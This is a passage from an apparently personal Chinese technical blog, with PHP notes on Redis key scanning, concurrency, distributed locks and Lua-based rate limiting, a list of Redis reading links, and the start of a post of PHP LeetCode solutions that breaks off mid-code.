$redis-&gt;scan($it, <span class="string">"mykey:*"</span>, <span class="number">10000</span>)) &#123;</span><br><span class="line">     foreach($arr_keys <span class="keyword">as</span> $str_key) &#123;</span><br><span class="line">         echo <span class="string">"Here is a key: $str_key\n"</span>;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $pattern_arr=[];</span><br><span class="line">         $pattern_arr[<span class="string">'COUNT'</span>] = <span class="number">10</span>;</span><br><span class="line"> $cursor = <span class="literal">null</span>;$i=<span class="number">0</span>;</span><br><span class="line">         <span class="keyword">while</span>($cursor !== <span class="number">0</span>)&#123;</span><br><span class="line">             <span class="comment">// 命令位置 vendor\predis\predis\src\Command\HashScan.php</span></span><br><span class="line">             $info = $redis-&gt;hscan(<span class="string">'news:all'</span>, $cursor, $pattern_arr);</span><br><span class="line">             $cursor = intval($info[<span class="number">0</span>]);dump(count($info[<span class="number">1</span>]));</span><br><span class="line">             $list = $info[<span class="number">1</span>] ?$info[<span class="number">1</span>]: [];$i++;</span><br><span class="line">             <span class="keyword">if</span>($list)&#123;</span><br><span class="line">                 $del_field = [];</span><br><span class="line">                 foreach($list <span class="keyword">as</span> $field=&gt;$v)&#123;</span><br><span class="line">                     $del_field[] = $field;</span><br><span class="line">                 &#125;</span><br><span class="line">                 dump(count($del_field),$i);</span><br><span class="line">                 $redis-&gt;hdel(<span class="string">'news:all'</span>, $del_field);</span><br><span class="line">                 <span class="keyword">if</span> ($i &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                     <span class="keyword">break</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"> $cursor = <span class="number">0</span>;$i=<span class="number">0</span>;</span><br><span class="line"> <span class="keyword">do</span></span><br><span class="line">         &#123;</span><br><span class="line"> <span class="comment">//            $arr_keys = $redis-&gt;scan($it, 'app:read:news:uuid:*', $pattern_arr);</span></span><br><span class="line">             $arr_keys = $redis-&gt;scan($cursor, <span class="string">'match'</span>, <span class="string">'app:read:news:uuid:*'</span>);dump($arr_keys);</span><br><span class="line">             <span class="keyword">if</span> (is_array($arr_keys) &amp;&amp; !empty($arr_keys))</span><br><span class="line">             &#123;</span><br><span class="line">                 foreach ($arr_keys <span class="keyword">as</span> $str_key)</span><br><span class="line">                 &#123;</span><br><span class="line">                     dump($str_key);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125; <span class="keyword">while</span> ($arr_keys !== <span class="literal">false</span>);</span><br><span class="line"> http:<span class="comment">//doc.redisfans.com/key/scan.html</span></span><br></pre></td></tr></table></figure>
<h3 id="redis中的并发问题"><a href="#redis中的并发问题" class="headerlink" title="redis中的并发问题"></a>redis中的并发问题</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span> <span class="string">"vendor/autoload.php"</span>;</span><br><span class="line"><span class="comment">//https://www.cnblogs.com/iforever/p/5796902.html</span></span><br><span class="line">$client = <span class="keyword">new</span> Predis\Client([</span><br><span class="line">    <span class="string">'scheme'</span> =&gt; <span class="string">'tcp'</span>,</span><br><span class="line">    <span class="string">'host'</span> =&gt; <span class="string">'127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'port'</span> =&gt; <span class="number">6379</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">1000</span>; $i++) &#123;</span><br><span class="line">    $num = intval($client-&gt;get(<span class="string">"name"</span>));</span><br><span class="line">    $num = $num + <span class="number">1</span>;</span><br><span class="line">    $client-&gt;setex(<span class="string">"name"</span>, $num, <span class="number">10080</span>);</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line">设置name初始值为<span class="number">0</span>，然后同时用两个终端执行上面的程序，最后name的值可能不是<span class="number">2000</span>，而是一个&lt;<span class="number">2000</span>的值，这也就证明了我们上面的并发问题的存在</span><br><span class="line">redis中命令是满足原子性的，因此在值为阿拉伯数字的时候，我可以将get和set命令修改为incr或者incrby</span><br><span class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">1000</span>; $i++) &#123;</span><br><span class="line">    $client-&gt;incr(<span class="string">"name"</span>);</span><br><span class="line">    $client-&gt;expire(<span class="string">"name"</span>, <span class="number">10800</span>);</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line">&#125;</span><br><span class="line">非数字那只能用watch、multi、exec了</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>）setnx(lockkey, 当前时间+过期超时时间) ，如果返回<span class="number">1</span>，则获取锁成功；如果返回<span class="number">0</span>则没有获取到锁，转向<span class="number">2</span>。</span><br><span class="line"><span class="number">2.</span>）get(lockkey)获取值oldExpireTime ，并将这个value值与当前的系统时间进行比较，如果小于当前系统时间，则认为这个锁已经超时，可以允许别的请求重新获取，转向<span class="number">3</span>。</span><br><span class="line"><span class="number">3.</span>）计算newExpireTime=当前时间+过期超时时间，然后getset(lockkey, newExpireTime) 会返回当前lockkey的值currentExpireTime。</span><br><span class="line"><span class="number">4.</span>）判断currentExpireTime与oldExpireTime 是否相等，如果相等，说明当前getset设置成功，获取到了锁。如果不相等，说明这个锁又被别的请求获取走了，那么当前请求可以直接返回失败，或者继续重试。</span><br><span class="line"><span class="number">5</span>） 在获取到锁之后，当前线程可以开始做自增操作，当处理完毕后，比较自己的处理时间和对于锁设置的超时时间，如果小于锁设置的超时时间，则直接执行<span class="keyword">delete</span>释放锁；如果大于锁设置的超时时间，则不需要再锁进行处理</span><br></pre></td></tr></table></figure>
<h3 id="Redis-使用-Lua-脚本替代-SETNX-DECR-保证原子性"><a href="#Redis-使用-Lua-脚本替代-SETNX-DECR-保证原子性" class="headerlink" title="Redis 使用 Lua 脚本替代 SETNX / DECR 保证原子性"></a>Redis 使用 Lua 脚本替代 SETNX / DECR 保证原子性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * TRUE: 触发限流，FALSE：未触发限流</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">acquire</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $redisHandler = $<span class="keyword">this</span>-&gt;redisInstance-&gt;getHandler();</span><br><span class="line">            $redisHandler-&gt;set($<span class="keyword">this</span>-&gt;rateLimitKey, $<span class="keyword">this</span>-&gt;tokenNum, [<span class="string">'nx'</span>, <span class="string">'ex'</span> =&gt; $<span class="keyword">this</span>-&gt;expireTime]);</span><br><span class="line">            $leftTokenNum = $redisHandler-&gt;decr($<span class="keyword">this</span>-&gt;rateLimitKey);</span><br><span class="line">            <span class="keyword">if</span> ($leftTokenNum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\Exception $e) &#123;</span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  使用 redis 来起到一个限流的作用，<span class="number">1</span> 秒钟只允许 <span class="number">1</span> 人购买</span><br><span class="line">  $redis-&gt;set(<span class="string">'key'</span>, <span class="string">'1'</span>, [<span class="string">'nx'</span>, <span class="string">'ex'</span>=&gt;<span class="number">1</span>]); 命令，设置值为 <span class="number">1</span> 过期时间为 <span class="number">1</span> 秒的计数器，基于该计数器的扣减来达到 <span class="number">1</span> 秒钟放行 <span class="number">1</span> 个请求的目的。</span><br><span class="line">    </span><br><span class="line">    $key = <span class="string">'test_redis_key'</span>;</span><br><span class="line">    $redis-&gt;set($key, <span class="string">'1'</span>, [<span class="string">'nx'</span>, <span class="string">'ex'</span> =&gt; <span class="number">1</span>]);</span><br><span class="line">    $left = $redis-&gt;decr($key);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ($left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="comment">// 这里通过状态码来更方便的观察</span></span><br><span class="line">      header(<span class="string">'Is-Limited:1'</span>, <span class="literal">true</span>, <span class="number">500</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      header(<span class="string">'Is-Limited:0'</span>, <span class="literal">true</span>, <span class="number">200</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    在 Redis key 未过期之前，DECR 命令都是正常扣减的。一旦 key 过期了，再执行 DECR 命令，会发现 key 的值和过期时间都变为 <span class="number">-1</span> 了。</span><br><span class="line">假设在第一句 SETNX 之后第二句 DECR 之前，key 过期了，再执行 DECR 就会先生成一个永不过期值为 <span class="number">0</span> 的 key。</span><br><span class="line"></span><br><span class="line">之后所有请求的 SETNX 都是 fasle，一直会基于这个永不过期的 key 进行递减，所有的 $leftTokenNum 都小于 <span class="number">0</span>，因此导致所有请求被限流。</span><br><span class="line"></span><br><span class="line">$key = <span class="string">'test_redis_key'</span>;</span><br><span class="line">$redis-&gt;set($key, <span class="string">'3'</span>, [<span class="string">'nx'</span>, <span class="string">'px'</span> =&gt; <span class="number">5</span>]); <span class="comment">// key 设置成 5 毫秒过期</span></span><br><span class="line">$left = $redis-&gt;decr($key);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($left &lt; <span class="number">0</span>) &#123;</span><br><span class="line">  <span class="comment">// 这里通过状态码来更方便的观察</span></span><br><span class="line">  header(<span class="string">'Is-Limited:1'</span>, <span class="literal">true</span>, <span class="number">500</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  header(<span class="string">'Is-Limited:0'</span>, <span class="literal">true</span>, <span class="number">200</span>);</span><br><span class="line">&#125;</span><br><span class="line">&gt; <span class="built_in">eval</span> <span class="string">"return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;"</span> <span class="number">2</span> key1 key2 first second</span><br><span class="line"><span class="number">1</span>) <span class="string">"key1"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"key2"</span></span><br><span class="line"><span class="number">3</span>) <span class="string">"first"</span></span><br><span class="line"><span class="number">4</span>) <span class="string">"second"</span></span><br><span class="line"></span><br><span class="line"> $key = <span class="string">'test_redis_key1'</span>;</span><br><span class="line"></span><br><span class="line">        $script = &lt;&lt;&lt;LUA</span><br><span class="line">local max = tonumber(ARGV[1])</span><br><span class="line">local interval_milliseconds = tonumber(ARGV[2])</span><br><span class="line">local current = tonumber(redis.call('get', KEYS[1]) or 0)</span><br><span class="line"></span><br><span class="line">if (current + 1 &gt; max) then</span><br><span class="line">    return true</span><br><span class="line">else</span><br><span class="line">    redis.call('incrby', KEYS[1], 1)</span><br><span class="line">    if (current == 0) then</span><br><span class="line">        redis.call('pexpire', KEYS[1], interval_milliseconds)</span><br><span class="line">    end</span><br><span class="line">    return false</span><br><span class="line">end</span><br><span class="line">LUA;</span><br><span class="line"></span><br><span class="line">        $redis-&gt;script('load', $script);</span><br><span class="line">        $isLimited = $redis-&gt;eval($script, [$key, 1, 5], 1); // key 5 毫秒过期</span><br><span class="line"></span><br><span class="line">        if ($isLimited) &#123;</span><br><span class="line">            header('Is-Limited:1', true, 500);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            header('Is-Limited:0', true, 200);</span><br><span class="line">        &#125;</span><br><span class="line">        Redis 中 DECR 一个不存在的 key 会先把 key 值设置为 0 , TTL 设置为 -1 (永不过期)，再进行减 1 操作。</span><br><span class="line">        使用 SETNX 配合 DECR 实现限流，会出现 key 永不过期情况。过期时间比较小或者高并发情况下，发生概率更高。</span><br><span class="line">        在 Redis 中执行 Lua 脚本是原子操作。</span><br><span class="line">        可以通过 Redis + Lua 实现高并发下的限流。https://learnku.com/articles/39265</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/uuk020/redis-reference-manual" target="_blank" rel="noopener">Redis 使用手册 PHP 代码实现</a></p>
<p><a href="https://learnku.com/articles/25892" target="_blank" rel="noopener">Redis 中 Keys 与 Scan 的使用</a></p>
<p><a href="https://learnku.com/articles/38228" target="_blank" rel="noopener">Redis 命令大全</a></p>
<p><a href="https://juejin.im/post/5bcfd17ff265da0ae50550f2" target="_blank" rel="noopener">Redis 命令行工具的妙用</a></p>
<p><a href="https://bettercuicui.github.io/2017/07/04/REDIS/redis%E8%BF%87%E6%9C%9F%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E5%88%A0%E9%99%A4%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">redis过期数据存储方式以及删除方式</a></p>
<p><a href="https://bettercuicui.github.io/2018/04/01/REDIS/redis%E8%B6%85%E6%97%B6%E9%97%AE%E9%A2%98%E6%8E%92%E6%9F%A5/#" target="_blank" rel="noopener">redis超时问题排查</a></p>
<p><a href="https://juejin.im/entry/5ba4eed3f265da0afc2bfb44" target="_blank" rel="noopener">分布式和redis</a></p>
<p><a href="https://learnku.com/articles/36375" target="_blank" rel="noopener">Redis 主从复制详细解读</a></p>
<p><a href="http://blog.13sai.com/essay/188" target="_blank" rel="noopener">从缓存穿透聊到布隆过滤器</a></p>
<p><a href="http://blog.13sai.com/essay/165" target="_blank" rel="noopener">基于redis的秒杀</a></p>
<p><a href="http://blog.13sai.com/essay/178" target="_blank" rel="noopener">Redis 为什么使用单进程单线程方式也这么快</a></p>
<p><a href="https://learnku.com/articles/24466" target="_blank" rel="noopener">面试时你可能需要的 Redis 知识技巧</a></p>
<p><a href="https://me.jinchuang.org/archives/430.html" target="_blank" rel="noopener">Redis 一站式管理平台工具ngbdf/redis-manager</a></p>
<p><a href="https://www.cnblogs.com/qingyunzong/p/9004509.html" target="_blank" rel="noopener">Kafka学习之路</a></p>
<p><a href="https://learnku.com/articles/33110" target="_blank" rel="noopener">redis限流</a></p>
<p><a href="https://learnku.com/articles/31068" target="_blank" rel="noopener">Redis &amp; 常用用法详情</a></p>
<p><a href="https://learnku.com/articles/30827" target="_blank" rel="noopener">Redis 应用-分布式锁</a></p>
<p><a href="https://github.com/mylxsw/redis-tui" target="_blank" rel="noopener">命令行的 Redis</a></p>
<p><a href="https://www.cnblogs.com/glon/p/6541709.html" target="_blank" rel="noopener">Redis 简单入门</a></p>
<p><a href="https://juejin.im/post/5cb13b4d6fb9a0687b7dd0bd" target="_blank" rel="noopener">50道Redis面试题史上最全</a></p>
<p><a href="https://shuwoom.com/?p=2563" target="_blank" rel="noopener">MYSQL性能优化学习笔记-(1)数据库设计</a></p>
<p><a href="https://learnku.com/articles/30214" target="_blank" rel="noopener">Redis In Action 笔记</a></p>
<p><a href="https://segmentfault.com/a/1190000017882763" target="_blank" rel="noopener">redis缓存雪崩、缓存穿透、缓存更新了解多少？github.com/ZhongFuCheng3y/3y</a></p>
<p><a href="https://learnku.com/articles/24802" target="_blank" rel="noopener">Redis 基础学习</a></p>
<p><a href="https://learnku.com/articles/31894" target="_blank" rel="noopener"> Redis bitmap 在微擎内做公众号的签到活动</a></p>
<p><a href="https://learnku.com/articles/29500" target="_blank" rel="noopener">Redis In Action 笔记</a></p>
<p><a href="https://juejin.im/post/5af5b2c36fb9a07ac65318bd" target="_blank" rel="noopener">使用缓存的正确姿势</a></p>
<p><a href="https://juejin.im/post/5b584831e51d45190d5556b2#heading-0" target="_blank" rel="noopener">Redis问题汇总</a></p>
<p><a href="https://learnku.com/articles/31351" target="_blank" rel="noopener">Redis 的第 n 次涉及</a></p>
<p><a href="https://my.oschina.net/editorial-story/blog/3052308?p=3" target="_blank" rel="noopener">epoll 的本质是什么</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/19/leetcode-题解/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/03/19/leetcode-题解/" itemprop="url">leetcode 题解</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-19T15:15:39+08:00">
                2019-03-19
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  494 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="Two-Sum"><a href="#Two-Sum" class="headerlink" title="Two Sum"></a>Two Sum</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。</span><br><span class="line">给定 nums = [<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>], target = <span class="number">9</span></span><br><span class="line">因为 nums[<span class="number">0</span>] + nums[<span class="number">1</span>] = <span class="number">2</span> + <span class="number">7</span> = <span class="number">9</span></span><br><span class="line">所以返回 [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">twoSum</span>(<span class="params">$nums, $target</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!isset($nums[<span class="number">1</span>])) <span class="keyword">return</span>;</span><br><span class="line">        foreach ($nums <span class="keyword">as</span> $key =&gt; $num) &#123;</span><br><span class="line">            unset($nums[$key]);</span><br><span class="line">            $result = array_search($target - $num, $nums);</span><br><span class="line">            <span class="keyword">if</span> ($result !== <span class="literal">false</span>) <span class="keyword">return</span> [$key, $result];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param String $J</span></span><br><span class="line"><span class="comment">     * @param String $S</span></span><br><span class="line"><span class="comment">     * @return Integer  https://learnku.com/articles/27545</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">numJewelsInStones</span>(<span class="params">$j, $s</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        $jArr = str_split($j);</span><br><span class="line">        $sArr = str_split($s);</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        foreach($sArr <span class="keyword">as</span> $sItem)&#123;</span><br><span class="line">            <span class="keyword">if</span>(in_array($sItem, $jArr))&#123;</span><br><span class="line">                $i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $i;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="在常数时间内检索到最小元素的栈"><a href="#在常数时间内检索到最小元素的栈" class="headerlink" title="在常数时间内检索到最小元素的栈"></a>在常数时间内检索到最小元素的栈</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    protected $stack;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * initialize your data structure here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;stack = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param Integer $x</span></span><br><span class="line"><span class="comment">     * @return NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;stack[] = $x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return NULL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">pop</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        array_pop($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">top</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> end($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @return Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getMin</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> min($<span class="keyword">this</span>-&gt;stack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Reverse-Integer"><a href="#Reverse-Integer" class="headerlink" title="Reverse Integer"></a>Reverse Integer</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="number">123</span></span><br><span class="line">输出: <span class="number">321</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reverse</span>(<span class="params">$x</span>) </span>&#123;</span><br><span class="line">        $result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (abs($x) &gt; <span class="number">9</span>) &#123;</span><br><span class="line">            $num = $x % <span class="number">10</span>;</span><br><span class="line">            $x = (int)($x / <span class="number">10</span>);</span><br><span class="line">            $result = $result * <span class="number">10</span> + $num;</span><br><span class="line">        &#125;</span><br><span class="line">        $result = $result * <span class="number">10</span> + $x;</span><br><span class="line">        <span class="keyword">if</span> (strlen(base_convert($result, <span class="number">10</span>, <span class="number">2</span>)) &gt; <span class="number">31</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> $result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="回文数"><a href="#回文数" class="headerlink" title="回文数"></a>回文数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">输入: <span class="number">121</span></span><br><span class="line">输出: <span class="literal">true</span></span><br><span class="line"></span><br><span class="line">输入: <span class="number">-123</span></span><br><span class="line">输出: <span class="literal">false</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">isPalindrome</span>(<span class="params">$x</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($x &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> ($x % <span class="number">10</span> === <span class="number">0</span> &amp;&amp; $x != <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        $reverse = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($x &gt; $reverse) &#123;</span><br><span class="line">            $reverse = (int)($reverse * <span class="number">10</span> + $x % <span 